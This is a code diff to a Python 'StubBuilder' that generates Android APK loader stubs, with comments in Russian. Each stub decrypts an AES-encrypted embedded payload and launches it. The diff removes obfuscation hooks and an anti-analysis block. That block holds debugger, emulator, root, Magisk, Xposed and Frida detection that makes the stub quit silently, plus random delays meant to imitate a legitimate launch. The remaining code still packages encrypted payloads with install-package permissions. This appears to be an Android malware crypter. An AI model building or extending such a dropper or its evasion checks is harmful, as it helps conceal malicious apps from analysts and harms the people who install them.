@@ -1,13 +1,10 @@
 import logging
 import os
-import random
 import shutil
 import subprocess
 import zipfile
 from pathlib import Path
 from xml.sax.saxutils import escape
-from services.obfuscator import CodeObfuscator
-from services.npmanager import NPManager
 
 logger = logging.getLogger(__name__)
 
@@ -26,9 +23,6 @@ class StubBuilder:
         self.keystore = None
         self.keystore_pass = os.getenv("ANDROID_KEYSTORE_PASS", "android")
         self.key_alias = os.getenv("ANDROID_KEY_ALIAS")
-        self.obfuscator = CodeObfuscator()
-        self.npmanager = NPManager()
-        logger.info("StubBuilder инициализирован с NPManager обфускацией")
         self.temp_dir = Path("temp/stub_build")
         self.temp_dir.mkdir(parents=True, exist_ok=True)
         logger.info("StubBuilder initialized")
@@ -478,13 +472,6 @@ class StubBuilder:
         with open(payload_file, "wb") as f:
             f.write(encrypted_payload)
         logger.info("Payload saved: %s", payload_file)
-        
-        # Добавляем маркер NPManager
-        npmanager_marker = project_dir / "assets" / "ProtectedByNPManager.txt"
-        marker_content = self.npmanager.generate_protection_marker()
-        with open(npmanager_marker, "w") as f:
-            f.write(marker_content)
-        logger.info("NPManager protection marker added")
 
         loader_code = self.generate_loader_activity(protection_config, apk_info)
         with open(
@@ -726,27 +713,6 @@ public class LoaderActivity extends Activity {{
     }}
 
     private void startDecryption() {{
-        // Имитация легитимного запуска - задержка
-        try {{
-            Thread.sleep({random.randint(500, 1500)});
-        }} catch (Exception e) {{}}
-        
-        // Множественные проверки окружения
-        if (!checkEnvironment()) {{
-            // Не показываем ошибку, просто закрываемся
-            try {{
-                Thread.sleep({random.randint(1000, 2000)});
-            }} catch (Exception e) {{}}
-            finish();
-            return;
-        }}
-        
-        // Проверка Google Play Services
-        if (!checkGooglePlayServices()) {{
-            finish();
-            return;
-        }}
-        
         final AlertDialog.Builder builder = new AlertDialog.Builder(this);
         builder.setTitle(APP_LABEL);
         builder.setMessage("Подготовка приложения...");
@@ -880,202 +846,6 @@ public class LoaderActivity extends Activity {{
         startActivity(launchIntent);
         finish();
     }}
-    
-    // ===== ЗАЩИТНЫЕ МЕХАНИЗМЫ =====
-    
-    private boolean isDebuggerConnected() {{
-        return android.os.Debug.isDebuggerConnected() || 
-               android.os.Debug.waitingForDebugger();
-    }}
-    
-    private boolean isEmulator() {{
-        // Проверка 1: Build параметры
-        String brand = android.os.Build.BRAND.toLowerCase();
-        String device = android.os.Build.DEVICE.toLowerCase();
-        String model = android.os.Build.MODEL.toLowerCase();
-        String product = android.os.Build.PRODUCT.toLowerCase();
-        String fingerprint = android.os.Build.FINGERPRINT.toLowerCase();
-        String hardware = android.os.Build.HARDWARE.toLowerCase();
-        
-        if (brand.contains("generic") || device.contains("generic") ||
-            model.contains("google_sdk") || model.contains("emulator") ||
-            model.contains("android sdk") || product.contains("sdk") ||
-            fingerprint.contains("generic") || fingerprint.contains("test-keys") ||
-            hardware.contains("goldfish") || hardware.contains("ranchu")) {{
-            return true;
-        }}
-        
-        // Проверка 2: Файлы эмулятора
-        String[] emulatorFiles = {{
-            "/dev/socket/qemud",
-            "/dev/qemu_pipe",
-            "/system/lib/libc_malloc_debug_qemu.so",
-            "/sys/qemu_trace",
-            "/system/bin/qemu-props"
-        }};
-        
-        for (String file : emulatorFiles) {{
-            if (new java.io.File(file).exists()) return true;
-        }}
-        
-        // Проверка 3: Телефонный номер эмулятора
-        try {{
-            android.telephony.TelephonyManager tm = 
-                (android.telephony.TelephonyManager) getSystemService(TELEPHONY_SERVICE);
-            String networkOperator = tm.getNetworkOperatorName();
-            if (networkOperator != null && networkOperator.toLowerCase().equals("android")) {{
-                return true;
-            }}
-        }} catch (Exception e) {{}}
-        
-        return false;
-    }}
-    
-    private boolean isRooted() {{
-        // Проверка 1: Файлы su
-        String[] suPaths = {{
-            "/system/app/Superuser.apk",
-            "/sbin/su", "/system/bin/su", "/system/xbin/su",
-            "/data/local/xbin/su", "/data/local/bin/su",
-            "/system/sd/xbin/su", "/system/bin/failsafe/su",
-            "/data/local/su", "/su/bin/su",
-            "/system/xbin/daemonsu"
-        }};
-        
-        for (String path : suPaths) {{
-            if (new java.io.File(path).exists()) return true;
-        }}
-        
-        // Проверка 2: Magisk
-        String[] magiskPaths = {{
-            "/sbin/.magisk",
-            "/data/adb/magisk",
-            "/data/adb/modules"
-        }};
-        
-        for (String path : magiskPaths) {{
-            if (new java.io.File(path).exists()) return true;
-        }}
-        
-        // Проверка 3: Выполнение su
-        try {{
-            Process p = Runtime.getRuntime().exec("su");
-            java.io.BufferedReader reader = new java.io.BufferedReader(
-                new java.io.InputStreamReader(p.getInputStream()));
-            String line = reader.readLine();
-            p.destroy();
-            if (line != null) return true;
-        }} catch (Exception e) {{}}
-        
-        // Проверка 4: Busybox
-        try {{
-            Process p = Runtime.getRuntime().exec("which su");
-            java.io.BufferedReader reader = new java.io.BufferedReader(
-                new java.io.InputStreamReader(p.getInputStream()));
-            String line = reader.readLine();
-            p.destroy();
-            if (line != null && !line.isEmpty()) return true;
-        }} catch (Exception e) {{}}
-        
-        return false;
-    }}
-    
-    private boolean checkGooglePlayServices() {{
-        // Проверка наличия Google Play Services
-        try {{
-            getPackageManager().getPackageInfo("com.google.android.gms", 0);
-            return true;
-        }} catch (Exception e) {{
-            return false;
-        }}
-    }}
-    
-    private boolean isXposedActive() {{
-        // Проверка Xposed Framework
-        try {{
-            throw new Exception();
-        }} catch (Exception e) {{
-            for (StackTraceElement element : e.getStackTrace()) {{
-                if (element.getClassName().contains("de.robv.android.xposed")) {{
-                    return true;
-                }}
-            }}
-        }}
-        
-        // Проверка файлов Xposed
-        String[] xposedFiles = {{
-            "/system/framework/XposedBridge.jar",
-            "/system/lib/libxposed_art.so",
-            "/system/lib64/libxposed_art.so"
-        }};
-        
-        for (String file : xposedFiles) {{
-            if (new java.io.File(file).exists()) return true;
-        }}
-        
-        return false;
-    }}
-    
-    private boolean isFridaActive() {{
-        // Проверка Frida
-        String[] fridaPorts = {{"27042", "27043"}};
-        
-        for (String port : fridaPorts) {{
-            try {{
-                java.net.Socket socket = new java.net.Socket("127.0.0.1", Integer.parseInt(port));
-                socket.close();
-                return true;
-            }} catch (Exception e) {{}}
-        }}
-        
-        // Проверка процессов Frida
-        try {{
-            Process p = Runtime.getRuntime().exec("ps");
-            java.io.BufferedReader reader = new java.io.BufferedReader(
-                new java.io.InputStreamReader(p.getInputStream()));
-            String line;
-            while ((line = reader.readLine()) != null) {{
-                if (line.contains("frida") || line.contains("gum-js-loop")) {{
-                    return true;
-                }}
-            }}
-            p.destroy();
-        }} catch (Exception e) {{}}
-        
-        return false;
-    }}
-    
-    private boolean checkEnvironment() {{
-        // Множественные проверки с задержками
-        if (isDebuggerConnected()) {{
-            try {{ Thread.sleep({random.randint(100, 300)}); }} catch (Exception e) {{}}
-            return false;
-        }}
-        
-        if (isEmulator()) {{
-            try {{ Thread.sleep({random.randint(100, 300)}); }} catch (Exception e) {{}}
-            return false;
-        }}
-        
-        if (isRooted()) {{
-            try {{ Thread.sleep({random.randint(100, 300)}); }} catch (Exception e) {{}}
-            return false;
-        }}
-        
-        if (isXposedActive()) {{
-            try {{ Thread.sleep({random.randint(100, 300)}); }} catch (Exception e) {{}}
-            return false;
-        }}
-        
-        if (isFridaActive()) {{
-            try {{ Thread.sleep({random.randint(100, 300)}); }} catch (Exception e) {{}}
-            return false;
-        }}
-        
-        return true;
-    }}
-    
-    // ===== КОНЕЦ ЗАЩИТНЫХ МЕХАНИЗМОВ =====
 
     private byte[] decryptAES(byte[] encrypted) throws Exception {{
         int minLength = PAYLOAD_MAGIC.length + 1 + WRAP_SALT_LENGTH + NONCE_LENGTH
@@ -1255,8 +1025,6 @@ public class LoaderActivity extends Activity {{
     <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES"/>
     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
     <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
-    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
-    <uses-permission android:name="android.permission.INTERNET"/>
 
     <application
         android:label="@string/app_name"
